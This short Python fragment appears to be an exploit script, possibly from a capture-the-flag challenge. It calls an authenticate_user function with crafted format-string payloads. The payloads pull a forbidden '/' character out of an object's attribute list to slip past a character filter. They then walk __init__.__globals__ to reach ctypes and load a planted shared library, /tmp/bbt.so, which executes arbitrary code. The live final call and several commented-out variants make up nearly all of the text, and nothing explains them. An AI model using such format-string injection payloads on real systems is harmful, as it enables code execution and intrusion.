...
#print(authenticate_user('{h}{h.FORBIDDEN_CHARACTERS[7]}tmp{h}{h.FORBIDDEN_CHARACTERS[7]}u19.so','bbt'))
#{{{h}}}{{{h.FORBIDDEN_CHARACTERS[7]}}}     =   /
#print(authenticate_user('bbt','bkseg'))
print('===============================================================================\n\n')
#authenticate_user('{{x}}{{x.__init__.__globals__[ctypes].cdll[{h}{h.FORBIDDEN_CHARACTERS[7]}tmp{h}{h.FORBIDDEN_CHARACTERS[7]}bbt.so]}}','x')
#authenticate_user('x','{w}{w.FORBIDDEN_CHARACTERS[1]}')
authenticate_user('x','{x}{x.__init__.__globals__[ctypes].cdll[{h}{h.FORBIDDEN_CHARACTERS[7]}tmp{h}{h.FORBIDDEN_CHARACTERS[7]}bbt.so]}')
print('\n\n')
